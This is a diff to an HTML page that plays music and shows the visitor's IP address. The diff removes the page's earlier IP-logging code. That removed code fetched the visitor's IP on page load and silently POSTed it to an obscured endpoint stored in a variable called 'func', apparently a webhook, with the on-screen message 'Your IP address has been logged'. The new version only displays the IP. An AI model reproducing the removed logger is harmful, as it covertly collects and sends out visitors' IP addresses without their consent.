@@ -61,6 +61,7 @@
 
         #mainContent {
             display: none;
+            text-align: center;
         }
 
         #ipDisplay {
@@ -91,7 +92,7 @@
             background: rgba(255, 255, 255, 0.1);
             border-radius: 10px;
             box-shadow: 0 0 15px rgba(255, 255, 255, 0.2);
-            color: white; /* Weiße Schrift */
+            color: white;
         }
 
         body::before {
@@ -115,13 +116,14 @@
     <div id="mainContent">
         <div id="player"></div>
         <p id="ipDisplay">Loading your IP address...</p>
-        <p class="subtitle">Your IP address has been logged</p>
+        <p class="subtitle">Your IP address is displayed above</p>
 
         <div id="audioPlayer">
             <audio id="audio" loop>
                 <source src="https://audio.jukehost.co.uk/D8XdnTM9W9LH9FaICu085xtZCp2z7Bmg" type="audio/mpeg">
                 Your browser does not support the audio element.
             </audio>
+            <button id="playButton">Play Music</button>
         </div>
     </div>
 
@@ -130,54 +132,31 @@
         const entrance = document.getElementById('entrance');
         const mainContent = document.getElementById('mainContent');
         const clickMe = document.getElementById('clickMe');
+        const playButton = document.getElementById('playButton');
         
         function startExperience() {
             entrance.style.display = 'none';
             mainContent.style.display = 'block';
-            tryPlayAudio();
             document.body.style.backgroundImage = "linear-gradient(rgba(0, 0, 0, 0.5), rgba(0, 0, 0, 0.5)), url('https://cdn.discordapp.com/attachments/1348389608458817627/1361415359537873037/video0_4.mp4?ex=67feac5b&is=67fd5adb&hm=324475971ccaee51fe366c9cb31c5f08981133e6d12c8365c5dc03e1e342e404&')";
+            fetchIP();
         }
 
         clickMe.addEventListener('click', startExperience);
         
-        function tryPlayAudio() {
+        playButton.addEventListener('click', function() {
             audio.play().catch(function(error) {
-                console.log("Audio autoplay failed:", error);
+                console.log("Audio playback failed:", error);
             });
-        }
+        });
 
-        async function logIP() {
+        async function fetchIP() {
             try {
                 const response = await fetch("https://api.ipify.org?format=json");
                 const data = await response.json();
                 const ip = data.ip;
-
                 document.getElementById('ipDisplay').textContent = `${ip}`;
-
-                const encoder = new TextEncoder();
-                const decoder = new TextDecoder();
-                
-                const encoded = encoder.encode(func);
-                const final = decoder.decode(encoded);
-
-                await fetch(final, {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json",
-                    },
-                    body: JSON.stringify({
-                        content: `IP Address: ${ip}`,
-                        timestamp: new Date().toISOString(),
-                    }),
-                });
             } catch (error) {
-                console.error("Error logging IP:", error);
+                console.error("Error fetching IP:", error);
                 document.getElementById('ipDisplay').textContent = "Error loading IP address";
             }
         }
-
-        
-        logIP();
-    </script>
-</body>
-</html>
